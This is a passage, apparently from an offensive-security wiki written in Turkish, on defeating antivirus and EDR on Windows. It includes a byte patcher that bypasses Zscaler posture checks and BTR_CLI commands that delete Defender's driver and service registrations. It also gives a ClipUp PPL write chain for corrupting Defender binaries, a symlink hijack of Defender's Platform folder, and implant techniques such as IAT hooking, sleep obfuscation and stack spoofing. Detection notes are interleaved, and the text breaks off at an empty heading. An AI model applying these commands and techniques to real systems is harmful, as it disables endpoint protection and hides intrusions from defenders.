•  Yeni *kernel* service oluşturulmalarını izleyin ve bir driver world-writable bir directory'den yüklendiğinde veya allow-list'te bulunmadığında alarm üretin.
•  User-mode handle'ların custom device object'lere açılmasını ve ardından gerçekleştirilen şüpheli `DeviceIoControl` çağrılarını izleyin.

### Disk Üzerindeki Binary Patching ile Zscaler Client Connector Posture Checks'i Bypass Etme

Zscaler’ın **Client Connector** ürünü device-posture kurallarını yerel olarak uygular ve sonuçları diğer component'lere iletmek için Windows RPC'ye güvenir. İki zayıf design choice tam bir bypass'ı mümkün kılar:

1. Posture evaluation **tamamen client-side** gerçekleşir (server'a bir boolean gönderilir).
2. Internal RPC endpoint'ler yalnızca bağlanan executable'ın ( `WinVerifyTrust` aracılığıyla) **Zscaler tarafından signed** olduğunu doğrular.<sup>[[11]](#references)</sup>

**Disk üzerindeki dört signed binary'yi patch'leyerek** her iki mekanizma da etkisiz hale getirilebilir:

| Binary | Patch'lenen original logic | Sonuç |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her check'in compliant olması için daima `1` döndürür |
| `ZSAService.exe` | `WinVerifyTrust`'e indirect call | NOP'lanır ⇒ herhangi bir process (unsigned olsa bile) RPC pipe'larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirilir |
| `ZSATunnel.exe` | Tunnel üzerindeki integrity check'leri | Kısa devre yapılır |

Minimal patcher alıntısı:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Orijinal dosyaları değiştirdikten ve service stack'i yeniden başlattıktan sonra:

* **Tüm** posture check'ler **green/compliant** olarak görünür.
* İmzasız veya değiştirilmiş binary'ler, adlandırılmış pipe RPC endpoint'lerini açabilir (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ele geçirilmiş host, Zscaler policy'leri tarafından tanımlanan internal network'e kısıtlamasız erişim elde eder.

Bu case study, tamamen client-side trust kararlarının ve basit signature check'lerinin birkaç byte patch'iyle nasıl etkisizleştirilebileceğini gösterir.

## Microsoft Defender `BTR.sys` trusted-functionality abuse

Defender'ın **Boot-Time Removal** driver'ı, klasik BYOVD için yararlı bir karşı örnektir. `BTR.sys`, memory-corruption bug'ı ve IOCTL interface'i olmayan, Microsoft tarafından imzalanmış meşru bir remediation component'idir; administrator access ve `SeLoadDriverPrivilege` elde edildikten sonra operator, bunun yerine private remediation transaction'ını taklit edebilir ve amaçlanan Ring-0 file/registry işlemlerini gerçekleştirebilir. Bu, **initial access veya privilege escalation değil, compromise sonrası AV/EDR-neutralization primitive'idir** ve driver, dikkat çekici bir third-party driver içe aktarmak yerine hedefin kendi `MpEngine.dll` dosyasındaki `BOOTTIMETOOL` resource'undan çıkarılabilir.<sup>[[36]](#references)</sup>

### One-shot driver'ı staging etme

Defender normalde resource'u rastgele bir `[a-z]{8}.sys` dosyası olarak bırakır ve benzer şekilde adlandırılmış bir kernel service kaydeder. `DriverEntry`, service'in `Args` değerini okur, başvurulan NTFS ADS'yi açar, action list'i decrypt edip doğrular, feedback yazar ve başarılı execution sonrasında `0xC0000056` (`STATUS_DELETE_PENDING`) döndürür; böylece driver resident olarak kalmak yerine unload edilir. Forged service aşağıdaki karakteristik değerlere sahiptir.<sup>[[36]](#references)[[37]](#references)</sup>
```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```
`:changelist` stream'i bir adet RC4-şifreli blob içerir. Analiz edilen build'ler sabit bir 256 baytlık anahtarı yeniden kullandığından, şifreleme bir yetkilendirme sınırı değildir. Geçerli bir plaintext, 24 baytlık bir global header (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, header CRC'si ve payload'dan türetilen transaction ID) ile başlar; bunu null-terminated bir UTF-16 feedback path ve herhangi bir sayıda item izler. Her item, action'a özgü verinin ardından **tam olarak dört NUL byte** ile sonlanan 16 baytlık bir header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) içerir. Her header/data bölgesi, başlangıç durumu `0xFFFFFFFF` ve **final XOR olmadan** (`~CRC32`) CRC-32 polinomu `0xEDB88320` kullanılarak bağımsız şekilde kontrol edilir; CRC state her bölge için sıfırlanır.<sup>[[36]](#references)[[37]](#references)</sup>

Kabul edilen action ID'leri aşağıdaki kernel primitive'lerini ortaya çıkarır.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Item verisi | Sonuç |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Kilitli bir dosya da dahil olmak üzere bir dosyayı siler |
| 2 | `[UTF-16 path]` | Boş bir dizini kaldırır |
| 3 | `[Flags][source][destination]` | Bir dosyayı attacker tarafından seçilen protected path'e taşır; boş bir destination silme işlemi anlamına gelir |
| 4 | `[Flags][key path]` | Bir registry key'ini recursive olarak siler |
| 5 | `[Flags][key path + "\\" + value]` | Bir registry value'sunu siler |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Bir registry value'su oluşturur/günceller ve eksik key path'lerini oluşturur |

Action 5 ve 6 için on-wire key/value separator'ı **art arda gelen iki backslash** karakteridir; geleneksel biçimde formatlanmış bir path doğru şekilde split edilmez. Feedback file çoğunlukla request'i yansıtır, ancak her item'ın ilk dört data byte'ı sonuçta oluşan `NTSTATUS` değerine dönüşür. Başlangıçta flags field'ı bulunmayan action 1 ve 2 için BTR, bu status değerine yer açmak amacıyla path'i ayrılmış son dört byte'a kaydırır.<sup>[[36]](#references)</sup>

### `BTR_CLI` workflow ve early-boot window

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI), zincirin tamamını uygular: yerel Defender'dan `BTR.sys` dosyasını çıkarır, `<random>.sys:changelist` ve bir feedback stream oluşturur, zincirlenmiş action'ları serialize/checksum/encrypt eder, service registry key'ini doğrudan oluşturur, ardından `-trigger now` için `NtLoadDriver` çağrısı yapar veya `-trigger boot` için bunu system-start driver olarak bırakır. Doğrudan registry staging, normal SCM `CreateServiceW` path'ini atladığından service-install Event ID 7045 üretmez. Boot-triggered artifact'lar daha sonra `BTR_CLI.exe -cleanup <service_name>` ile kaldırılabilir.<sup>[[36]](#references)[[37]](#references)</sup>
```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```
`Start=0` kullanılabilir değildir çünkü BTR, storage stack ve `SystemRoot` linki hazır olmadan önce `DriverEntry` üzerinden file I/O gerçekleştirir. `Start=1` ve yüksek öncelikli `Boot Bus Extender` grubu ise bunun yerine Phase 1'de çalışır: NTFS kullanılabilir durumdadır, ancak birçok system-start security driver'ı ve user-mode EDR service'i henüz başlatılmamıştır. `WdFilter` gibi boot-start filter'ları zaten yüklenmiş olabilir; ancak BTR, bir sonraki başlatmadan önce bunların binary dosyalarını veya service configuration'ını kaldırabilir ve SCM bunları başlatmadan önce service executable'larını silebilir. ELAM bu açığı kapatmaz çünkü BTR, boot-start evaluation sonrasında çalışır ve geçerli bir Microsoft signature taşır.<sup>[[36]](#references)</sup>

Birden fazla action tek bir transaction içinde çalışır. PoC, hard-coded `\SystemRoot\Temp\BootClean.log` için Action 1'i öne ekler: BTR bu log'u oluşturur, ardından kendi delete request'ini tüketir ve unload işleminden önce log'u kaldırır. Bu, kanıtı azaltırken feedback'in `<random>.sys:<random>.dat` içine yerleştirilmesi driver'ı ve her iki stream'i birlikte kaldırmayı sağlar.<sup>[[36]](#references)[[37]](#references)</sup>

### High-signal detection correlations

Yalnızca signature tabanlı kurallar ve Microsoft vulnerable-driver blocklist'i, BTR'ın amaçlanan functionality'sinin kötüye kullanılmasını ele almaz. Legitimate Defender lineage ile arbitrary launcher'ı ayırt ederken aşağıdaki behavioral correlation'ları tercih edin.<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` oluşturulması BTR staging için evrenseldir. Aynı `.sys` dosyasına bağlı bir `.dat` ADS özellikle şüphelidir çünkü legitimate Defender normalde feedback'i `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` altında yerleştirir.
- **Sysmon 12/13 without System 7045:** `Args=...:changelist` ve `Group=Boot Bus Extender` içeren `HKLM\SYSTEM\CurrentControlSet\Services\<random>` öğesinin doğrudan oluşturulmasını, karşılık gelen SCM installation event'i olmamasıyla birlikte correlate edin.
- **Sysmon 6 -> 23:** Non-Defender lineage'a ait bilinen bir BTR driver load işlemini, özellikle security binary'leri için `System`/PID 4'e atfedilen sonraki file deletion ile correlate edin.
- **Sysmon 11 -> 23:** `System`/PID 4 tarafından `\SystemRoot\Temp\BootClean.log` dosyasının hızla oluşturulup silinmesi konusunda alert üretin.
- `SeLoadDriverPrivilege` atamasını/etkinleştirilmesini kısıtlayın ve audit edin; bir security-tool driver'ı `cmd.exe`, PowerShell veya bilinmeyen bir process tarafından stage edildiğinde yalnızca Microsoft signature yeterli bir güven unsuru değildir.

## Protected Process Light (PPL) Kötüye Kullanılarak LOLBIN'lerle AV/EDR'ye Tamper Etme

Protected Process Light (PPL), yalnızca eşit veya daha yüksek seviyede protected process'lerin birbirine tamper edebilmesini sağlamak için bir signer/level hierarchy uygular. Offensive açıdan, PPL-enabled bir binary'yi legitimate şekilde başlatabiliyor ve arguments'larını kontrol edebiliyorsanız benign functionality'yi (ör. logging), AV/EDR tarafından kullanılan protected directory'lere karşı kısıtlı, PPL-backed bir write primitive'e dönüştürebilirsiniz.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Bir process'in PPL olarak çalışmasını sağlayanlar
- Hedef EXE (ve yüklenen tüm DLL'ler), PPL-capable bir EKU ile imzalanmış olmalıdır.
- Process, şu flag'lerle CreateProcess kullanılarak oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Binary'nin signer'ıyla eşleşen uyumlu bir protection level istenmelidir (ör. anti-malware signer'ları için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signer'ları için `PROTECTION_LEVEL_WINDOWS`). Yanlış level'lar creation işleminin başarısız olmasına neden olur.

PP/PPL ve LSASS protection hakkında daha kapsamlı bir giriş için buraya da bakın:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (protection level'ı seçer ve arguments'ları hedef EXE'ye forward eder):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Signed system binary `C:\Windows\System32\ClipUp.exe` kendi alt işlemini başlatır ve çağıran tarafından belirtilen bir yola log dosyası yazmak için bir parametre kabul eder.
- PPL process olarak başlatıldığında dosya yazma işlemi PPL desteğiyle gerçekleşir.
- ClipUp, boşluk içeren yolları ayrıştıramaz; normalde korunan konumları belirtmek için 8.3 short paths kullanın.

8.3 short path helpers
- Short names listelemek için: Her üst dizinde `dir /x`.
- cmd içinde short path türetmek için: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-capable LOLBIN'i (ClipUp) bir launcher (ör. CreateProcessAsPPL) kullanarak `CREATE_PROTECTED_PROCESS` ile başlatın.
2) Korunan bir AV dizininde (ör. Defender Platform) dosya oluşturmayı zorlamak için ClipUp log-path argümanını geçirin. Gerekirse 8.3 short names kullanın.
3) Hedef binary normalde AV tarafından çalışırken açılıyor veya kilitleniyorsa (ör. MsMpEng.exe), AV başlamadan önce boot sırasında yazma işlemini zamanlayın; bunun için daha erken ve güvenilir şekilde çalışan bir auto-start service yükleyin. Boot sıralamasını Process Monitor (boot logging) ile doğrulayın.
4) Yeniden başlatmanın ardından PPL-backed write, AV binary'lerini kilitlemeden önce gerçekleşir; bu da hedef dosyayı bozarak başlangıcı engeller.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notlar ve kısıtlamalar
- ClipUp'ın yazdığı içerikleri yerleşim dışında kontrol edemezsiniz; primitive, hassas içerik enjeksiyonundan ziyade bozulma için uygundur.
- Bir service'i yüklemek/başlatmak ve reboot window için local admin/SYSTEM gerekir.
- Zamanlama kritiktir: hedef açık olmamalıdır; boot-time execution file lock'larını önler.

Tespitler
- Özellikle boot sırasında, standart olmayan launcher'lar tarafından parent edilmiş olağandışı argümanlara sahip `ClipUp.exe` process creation olayları.
- Şüpheli binary'leri auto-start yapacak şekilde yapılandırılmış ve sürekli olarak Defender/AV'den önce başlayan yeni service'ler. Defender startup failures öncesinde service creation/modification olup olmadığını araştırın.
- Defender binary'leri/Platform directory'leri üzerinde file integrity monitoring; protected-process flag'lerine sahip process'ler tarafından beklenmedik file creation/modification işlemleri.
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` ile oluşturulan process'leri ve AV olmayan binary'lerin anomalous PPL level kullanımını arayın.

Azaltıcı önlemler
- WDAC/Code Integrity: hangi signed binary'lerin PPL olarak ve hangi parent'lar altında çalışabileceğini kısıtlayın; meşru context'ler dışındaki ClipUp invocation işlemlerini engelleyin.
- Service hygiene: auto-start service'lerinin creation/modification işlemlerini kısıtlayın ve start-order manipulation'ı izleyin.
- Defender tamper protection ve early-launch protections'ın etkin olduğundan emin olun; binary corruption'a işaret eden startup errors'ı araştırın.
- Ortamınızla uyumluysa security tooling barındıran volume'larda 8.3 short-name generation'ı devre dışı bırakmayı değerlendirin (kapsamlı şekilde test edin).

## Symlink Hijack ile Microsoft Defender'a Tampering Uygulama: Platform Version Folder

Windows Defender, çalışacağı platformu şu konum altındaki subfolder'ları enumerate ederek seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

En yüksek lexicographic version string'e sahip subfolder'ı (ör. `4.18.25070.5-0`) seçer ve ardından Defender service process'lerini buradan başlatır (service/registry path'lerini buna göre günceller). Bu seçim, directory reparse point'leri (symlink'ler) dahil olmak üzere directory entry'lerine güvenir. Bir administrator, Defender'ı attacker-writable bir path'e yönlendirmek ve DLL sideloading veya service disruption elde etmek için bundan yararlanabilir.<sup>[[21]](#references)[[22]](#references)</sup>

Ön koşullar
- Local Administrator (Platform folder altında directory/symlink oluşturmak için gerekir)
- Reboot gerçekleştirme veya Defender platform re-selection'ını tetikleme yeteneği (boot sırasında service restart)
- Yalnızca built-in tools gerekir (mklink)

Nasıl çalışır
- Defender kendi folder'larına yapılan write işlemlerini engeller; ancak platform selection directory entry'lerine güvenir ve target'ın protected/trusted bir path'e çözümlendiğini doğrulamadan lexicographically en yüksek version'ı seçer.

Adım adım (örnek)
1) Mevcut platform folder'ının writable bir clone'unu hazırlayın; ör. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde klasörünüze işaret eden daha yüksek sürüm numaralı bir directory symlink oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger seçimi (reboot önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)'in yönlendirilen yoldan çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Yeni process path'ini `C:\TMP\AV\` altında ve service configuration/registry kayıtlarının bu konumu gösterdiğini gözlemlemelisiniz.

Post-exploitation seçenekleri
- DLL sideloading/code execution: Defender'ın application directory içinden yüklediği DLL'leri, Defender process'lerinde code execute etmek için bırakın/değiştirin. Yukarıdaki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Version-symlink'i kaldırın; böylece sonraki başlatmada yapılandırılan path çözümlenemez ve Defender başlatılamaz:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Bu tekniğin tek başına privilege escalation sağlamadığını unutmayın; admin rights gerektirir.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams, Import Address Table (IAT) hooking yapıp seçili API'leri attacker-controlled, position-independent code (PIC) üzerinden yönlendirerek runtime evasion'ı C2 implant'ından çıkarıp hedef modülün kendisine taşıyabilir. Bu, evasion kapsamını birçok kitin sunduğu küçük API yüzeyinin (ör. CreateProcessA) ötesine genişletir ve aynı korumaları BOF'lara ve post-exploitation DLL'lerine de uygular.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Yüksek seviyeli yaklaşım
- Reflective loader kullanarak hedef modülün yanında (prepend edilmiş veya companion olarak) bir PIC blob stage edin. PIC self-contained ve position-independent olmalıdır.
- Host DLL yüklenirken IMAGE_IMPORT_DESCRIPTOR'ını dolaşın ve hedeflenen import'ların (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) IAT entry'lerini thin PIC wrapper'lara işaret edecek şekilde patch'leyin.
- Her PIC wrapper, gerçek API adresine tail-call yapmadan önce evasion işlemlerini gerçekleştirir. Yaygın evasion işlemleri şunlardır:
- Çağrı çevresinde memory mask/unmask uygulayın (ör. beacon bölgelerini encrypt etmek, RWX→RX, page name/permission'larını değiştirmek), ardından çağrı sonrasında geri yükleyin.
- Call-stack spoofing: benign bir stack oluşturun ve call-stack analysis'in beklenen frame'leri çözümlemesi için hedef API'ye geçiş yapın.<sup>[[9]](#references)</sup>
- Uyumluluk için bir interface export ederek bir Aggressor script'in (veya eşdeğerinin) Beacon, BOF'lar ve post-ex DLL'ler için hangi API'lerin hook edileceğini register etmesini sağlayın.

Burada neden IAT hooking kullanılıyor
- Hook'lanan import'u kullanan tüm code için, tool code'unu değiştirmeden veya belirli API'leri proxy'lemesi için Beacon'a güvenmeden çalışır.
- Post-ex DLL'lerini kapsar: LoadLibrary* hooking, modül yüklemelerini (ör. System.Management.Automation.dll, clr.dll) intercept etmenize ve aynı masking/stack evasion işlemlerini bunların API çağrılarına uygulamanıza olanak tanır.
- CreateProcessA/W'i wrapping ederek call-stack–based detection'lara karşı process-spawning post-ex command'lerinin güvenilir şekilde kullanılmasını geri kazandırır.

Minimal IAT hook taslağı (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notlar
- Yamayı relocations/ASLR sonrasında ve import'un ilk kullanımından önce uygulayın. TitanLdr/AceLdr gibi Reflective loader'lar, yüklenen modülün DllMain'i sırasında hooking işlemini göstermektedir.
- Wrapper'ları küçük ve PIC-safe tutun; gerçek API'yi patch işleminden önce yakaladığınız özgün IAT değerini kullanarak veya LdrGetProcedureAddress aracılığıyla çözümleyin.
- PIC için RW → RX geçişleri kullanın ve writable+executable sayfalar bırakmaktan kaçının.

Call-stack spoofing stub
- Draugr tarzı PIC stub'ları sahte bir call chain oluşturur (benign modüller içindeki return address'ler) ve ardından gerçek API'ye pivot eder.
- Bu yöntem, Beacon/BOF'lerden hassas API'lere giden canonical stack'leri bekleyen detection'ları aşar.
- API prologue'una gelmeden önce beklenen frame'lerin içine yerleşmek için stack cutting/stack stitching teknikleriyle birlikte kullanın.

Operasyonel entegrasyon
- PIC ve hook'ların DLL yüklendiğinde otomatik olarak başlatılması için reflective loader'ı post-ex DLL'lerinin başına ekleyin.
- Beacon ve BOF'lerin aynı evasion path'ten kod değişikliği olmadan yararlanması için hedef API'leri kaydetmek üzere bir Aggressor script kullanın.

Detection/DFIR değerlendirmeleri
- IAT integrity: non-image (heap/anon) adreslerine çözümlenen entry'ler; import pointer'larının periyodik olarak doğrulanması.
- Stack anomalies: loaded image'lara ait olmayan return address'ler; non-image PIC'e ani geçişler; tutarsız RtlUserThreadStart ancestry.
- Loader telemetry: process içinden IAT'e yapılan yazmalar, import thunk'larını değiştiren erken DllMain etkinliği, load sırasında oluşturulan beklenmeyen RX bölgeleri.
- Image-load evasion: hooking LoadLibrary* kullanılıyorsa, memory masking olaylarıyla ilişkilendirilen şüpheli automation/clr assembly yüklemelerini izleyin.

İlgili building block'ler ve örnekler
- Load sırasında IAT patching gerçekleştiren reflective loader'lar (ör. TitanLdr, AceLdr)
- Memory masking hook'ları (ör. simplehook) ve stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub'ları (ör. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Resident PICO üzerinden import-time IAT hook'ları

Bir reflective loader'ı kontrol ediyorsanız, loader'ın `GetProcAddress` pointer'ını önce hook'ları kontrol eden özel bir resolver ile değiştirerek import'ları **`ProcessImports()` sırasında** hook'layabilirsiniz:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Transient loader PIC kendisini serbest bıraktıktan sonra da varlığını sürdüren bir **resident PICO** (persistent PIC object) oluşturun.
- Loader'ın import resolver'ını geçersiz kılan bir `setup_hooks()` function'ı export edin (ör. `funcs.GetProcAddress = _GetProcAddress`).
- `_GetProcAddress` içinde ordinal import'larını atlayın ve `__resolve_hook(ror13hash(name))` gibi hash-based bir hook lookup kullanın. Bir hook varsa onu döndürün; yoksa gerçek `GetProcAddress`'e devredin.
- Hook target'larını link time'da Crystal Palace `addhook "MODULE$Func" "hook"` entry'leriyle kaydedin. Hook, resident PICO içinde bulunduğu için geçerliliğini korur.

Bu yöntem, yüklenen DLL'in code section'ını load sonrasında patch etmeden **import-time IAT redirection** sağlar.

### Target PEB-walking kullandığında hook'lanabilir import'ları zorlama

Import-time hook'lar yalnızca function gerçekten target'ın IAT'inde bulunuyorsa tetiklenir. Bir modül API'leri PEB-walk + hash yoluyla çözümlüyorsa (import entry'si yoksa), gerçek bir import ekleyerek loader'ın `ProcessImports()` path'inin bunu görmesini sağlayın:

- Hashed export resolution'ı (ör. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) `&WaitForSingleObject` gibi doğrudan bir reference ile değiştirin.
- Compiler bir IAT entry'si üretir; böylece reflective loader import'ları çözümlerken interception mümkün olur.

### `Sleep()` patch etmeden Ekko tarzı sleep/idle obfuscation

`Sleep` patch etmek yerine implant'ın kullandığı **gerçek wait/IPC primitive'lerini** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`) hook'layın. Uzun wait'ler için, idle sırasında in-memory image'ı encrypt eden Ekko tarzı bir obfuscation chain içinde çağrıyı wrapper'layın:<sup>[[31]](#references)[[27]](#references)</sup>

- Bir callback sequence planlamak için `CreateTimerQueueTimer` kullanın; bu sequence, hazırlanmış `CONTEXT` frame'leriyle `NtContinue` çağırır.
- Tipik chain (x64): image'ı `PAGE_READWRITE` yapın → tüm mapped image üzerinde `advapi32!SystemFunction032` aracılığıyla RC4 encrypt uygulayın → blocking wait'i gerçekleştirin → RC4 decrypt uygulayın → PE section'larını dolaşarak **section başına permissions'ı geri yükleyin** → completion signal'ı gönderin.
- `RtlCaptureContext` bir `CONTEXT` template'i sağlar; bunu birden fazla frame'e clone edin ve her step'i çağırmak için register'ları (`Rip/Rcx/Rdx/R8/R9`) ayarlayın.

Operasyonel ayrıntı: Uzun wait'ler için (ör. `WAIT_OBJECT_0`) “success” döndürün; böylece image maskelenmiş durumdayken caller devam eder. Bu pattern, idle window'ları sırasında modülü scanner'lar tarafından gizler ve klasik “patched `Sleep()`” signature'ından kaçınır.

Detection fikirleri (telemetry tabanlı)
- `NtContinue`'a işaret eden `CreateTimerQueueTimer` callback burst'leri.
- Büyük ve bitişik, image boyutundaki buffer'lar üzerinde kullanılan `advapi32!SystemFunction032`.
- Büyük aralıklı `VirtualProtect` çağrılarının ardından custom section başına permissions restoration işlemi.

### Sleep-obfuscation gadget'ları için runtime CFG registration

CFG-enabled target'larda `jmp [rbx]` veya `jmp rdi` gibi bir mid-function gadget'a yapılan ilk indirect jump genellikle process'i `STATUS_STACK_BUFFER_OVERRUN` ile çökertir; çünkü gadget modülün CFG metadata'sında bulunmaz. Ekko/Kraken tarzı chain'leri hardened process'ler içinde çalışır durumda tutmak için:<sup>[[30]](#references)</sup>

- Chain tarafından kullanılan her indirect destination'ı `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` ve `CFG_CALL_TARGET_VALID` entry'leriyle register edin.
- Loaded image'ların (`ntdll`, `kernel32`, `advapi32`) içindeki adresler için `MEMORY_RANGE_ENTRY`, **image base** ile başlamalı ve **tüm image size'ını** kapsamalıdır.
- Manually mapped/PIC/stomped bölgeler için bunun yerine **allocation base** ve allocation size kullanın.
- Yalnızca dispatch gadget'ını değil, indirect olarak ulaşılan export'ları da (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall'ları) ve indirect target haline gelecek attacker-controlled executable section'ları da işaretleyin.

Bu, ROP/JOP tarzı sleep chain'lerini “yalnızca non-CFG process'lerde çalışır” durumundan `/guard:cf` ile derlenmiş `explorer.exe`, browser'lar, `svchost.exe` ve diğer endpoint'ler için reusable bir primitive'e dönüştürür.

### Sleeping thread'ler için CET-safe stack spoofing

Tam `CONTEXT` replacement gürültülüdür ve CET Shadow Stack sistemlerinde sorun çıkarabilir; çünkü spoof edilmiş `Rip` yine de hardware shadow stack ile uyumlu olmalıdır. Daha güvenli bir sleep-masking pattern'i şöyledir:<sup>[[30]](#references)</sup>

- Aynı process içindeki başka bir thread'i seçin ve `NtQueryInformationThread` aracılığıyla onun `NT_TIB` / TEB stack bounds değerlerini (`StackBase`, `StackLimit`) okuyun.
- Mevcut thread'in gerçek TEB/TIB değerlerini yedekleyin.
- Gerçek sleeping context'i `GetThreadContext` ile yakalayın.
- Spoof context'e yalnızca gerçek `Rip`'i kopyalayın; spoof edilmiş `Rsp`/stack state'i olduğu gibi bırakın.
- Sleep window sırasında, stack walker'ların legitimate bir stack range içinde unwind yapması için spoof thread'in `NT_TIB` değerini mevcut TEB'e kopyalayın.
- Wait tamamlandıktan sonra özgün TIB'i ve thread context'i geri yükleyin.

Bu yöntem CET ile uyumlu bir instruction pointer korurken, unwind'leri doğrulamak için TEB stack metadata'sına güvenen EDR stack walker'larını yanıltır.

### APC-based alternative: Kraken Mask

Timer-queue dispatch fazla signature'lıysa, aynı sleep-encrypt-spoof-restore sequence'i queued APC'ler kullanılarak suspended bir helper thread'den çalıştırılabilir:<sup>[[27]](#references)</sup>

- Entry point olarak `NtTestAlert` kullanan bir helper thread oluşturun.
- Hazırlanmış `CONTEXT` frame'lerini/APC'leri `NtQueueApcThread` ile queue'layın ve `NtAlertResumeThread` ile tüketin.
- Default 64 KB thread stack'ini tüketmemek için chain state'i helper stack yerine heap üzerinde saklayın.
- Start event'i atomik olarak signal etmek ve block etmek için `NtSignalAndWaitForSingleObject` kullanın.
- Scanner'ın yarı geri yüklenmiş bir stack'i yakalayabileceği race window'ını azaltmak için TIB/context'i geri yüklemeden önce main thread'i suspend edin (`NtSuspendThread` → restore → `NtResumeThread`).

Bu yöntem, aynı RC4 masking ve stack-spoofing hedeflerini korurken `CreateTimerQueueTimer` + `NtContinue` signature'ını helper-thread/APC signature'ı ile değiştirir.

Ek detection fikirleri
- Sleep, wait veya APC dispatch işlemlerinden kısa süre önce `VmCfgCallTargetInformation` ile `NtSetInformationVirtualMemory` kullanımı.
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` veya `ConnectNamedPipe` etrafında kullanılan `GetThreadContext`/`SetThreadContext`.
- `NtQueryInformationThread` sonrasında mevcut thread'in TEB/TIB stack bounds değerlerine doğrudan yazılması.
- Dolaylı olarak `SystemFunction032`, `VirtualProtect` veya section-permission restoration helper'larına ulaşan `NtQueueApcThread`/`NtAlertResumeThread` chain'leri.
- Signed module'ler içinde dispatch pivot'ları olarak `FF 23` (`jmp [rbx]`) veya `FF E7` (`jmp rdi`) gibi kısa gadget signature'larının tekrarlı kullanımı.


## Precision Module Stomping

Module stomping, belirgin private executable memory allocate etmek veya yeni bir sacrificial DLL yüklemek yerine payload'ları target process içinde zaten map edilmiş bir DLL'in **`.text` section'ından** çalıştırır. Overwrite target, process'in hâlâ ihtiyaç duyduğu code path'leri bozmadan payload'ı barındırabilecek **loaded, disk-backed image** olmalıdır.<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

